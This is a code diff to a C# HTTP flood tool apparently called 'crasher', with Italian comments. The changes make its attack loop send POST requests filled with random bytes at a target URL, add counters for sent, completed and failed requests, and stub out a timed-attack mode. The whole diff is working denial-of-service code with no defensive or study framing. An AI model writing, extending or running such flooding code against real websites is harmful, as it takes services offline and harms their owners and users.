@@ -9,6 +9,8 @@ using System.Runtime.Serialization;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Timers;
+using crasher.Helpers;
 using crasher.Model;
 
 namespace crasher.Attacks
@@ -17,20 +19,24 @@ namespace crasher.Attacks
     {
         private static WebClient client;
         private static WebRequest request;
+
         private static Thread[] threads;
         private static bool stopFlag = false;
         private static Uri Url;
         private static bool ThreadsStarted = false;
+        private static Attack attackInfo;
 
         /**
          * Metodo che starta l'attacco, tipo di attacco a seconda del flag "threading" in AttackSettings.cs
          * **/
-        public static void Start()
+        public static void Start(Attack attack)
         {
-            Console.Clear();
-            Url = new Uri(AttackSettings.Url);
+            attackInfo = attack;
+
+            Url = new Uri(attackInfo.Url);
             client = new WebClient();
 
+         
             Console.WriteLine("Threading mode: " + AttackSettings.Threading);
             if (AttackSettings.Threading)
             {
@@ -43,7 +49,9 @@ namespace crasher.Attacks
                 StartAttack();
             }
 
-            Console.WriteLine("Started client attack");
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.WriteLine("[Info] Started client attack");
+            Console.ForegroundColor = ConsoleColor.White;
         }
 
         /**
@@ -73,20 +81,20 @@ namespace crasher.Attacks
                 {
                     bool requestStatus = false;
 
-                    //Byte[] packet = Helpers.NetHelper.RandomFillPackets(AttackSettings.PacketSize);
-                    //WebResponse response = SendData(Url,packet,out requestStatus);
-
-                    SendRequest(Url,out requestStatus);
+                    Byte[] packet = Helpers.NetHelper.RandomFillPackets(AttackSettings.PacketSize);
+                    SendDataBuild2(Url, packet, out requestStatus);
 
                     //TWO TYPES OF ATTACK: HTTP GET REQUEST or HTTP POST REQUEST (SendRequest() or SendData())
 
+                    AttackStats.RequestSent += 1;
+
                     if (requestStatus)
                     {
-                        Console.WriteLine("OK");
+                        AttackStats.RequestDone += 1;
                     }
                     else
                     {
-                        Console.WriteLine("Request failed..");
+                        AttackStats.RequestFailed += 1;
                     }
                 }
                 else if (!ThreadsStarted)
@@ -95,6 +103,27 @@ namespace crasher.Attacks
                 }
             }
         }
+        /*
+         * 
+         * FINIRE TIMED ATTACK
+        private static void StartTimedAttack()
+        {
+            System.Timers.Timer attackTimer = new System.Timers.Timer(attackInfo.Time / AttackSettings.RequestPerSecond);
+
+            // Hook up the Elapsed event for the timer. 
+            attackTimer.Elapsed += OnTimedEvent;
+            attackTimer.AutoReset = true;
+            attackTimer.Enabled = true;
+        }
+
+        private static void OnTimedEvent(Object source, ElapsedEventArgs e)
+        {
+            
+        }
+
+        */
+
+
         /**
          * Ferma l'attacco a seconda del tipo utilizzato
          * **/
@@ -144,37 +173,47 @@ namespace crasher.Attacks
             status = true;
         }
 
-        public static WebResponse SendData(Uri url, byte[] data, out bool status)
+        public static string SendDataBuild2(Uri url, byte[] data, out bool status)
         {
-            request = WebRequest.Create(url);
-            request.Method = "POST";
-
-            byte[] byteArray = data;
-            request.ContentType = "application/x-www-form-urlencoded";
-            request.ContentLength = byteArray.Length;
-
             try
             {
+                // Create a request using a URL that can receive a post.   
+                WebRequest request = WebRequest.Create(url);
+                // Set the Method property of the request to POST.  
+                request.Method = "POST";
+                // Set the ContentType property of the WebRequest.  
+                request.ContentType = "application/x-www-form-urlencoded";
+                // Set the ContentLength property of the WebRequest.  
+                request.ContentLength = data.Length;
+                // Get the request stream.  
                 Stream dataStream = request.GetRequestStream();
                 // Write the data to the request stream.  
-                dataStream.Write(byteArray, 0, byteArray.Length);
+                dataStream.Write(data, 0, data.Length);
                 // Close the Stream object.  
                 dataStream.Close();
+                // Get the response.  
+                WebResponse response = request.GetResponse();
+                // Display the status.  
+                Console.WriteLine(((HttpWebResponse)response).StatusCode);
+                // Get the stream containing content returned by the server.  
+                dataStream = response.GetResponseStream();
+                // Open the stream using a StreamReader for easy access.  
+                StreamReader reader = new StreamReader(dataStream);
+                // Read the content.  
+                string responseFromServer = reader.ReadToEnd();
+                
+                // Clean up the streams.  
+                reader.Close();
+                dataStream.Close();
+                response.Close();
+
+                //return response
+                status = true;
+                return responseFromServer;
             }
-            catch (WebException we)
+            catch
             {
                 status = false;
-                return null;
-            }
-
-            //SOME SITES DO HTTP ERROR CODE 500
-            status = true;
-            try
-            {
-                return request.GetResponse();
-            }
-            catch (WebException ex)
-            {
                 return null;
             }
         }
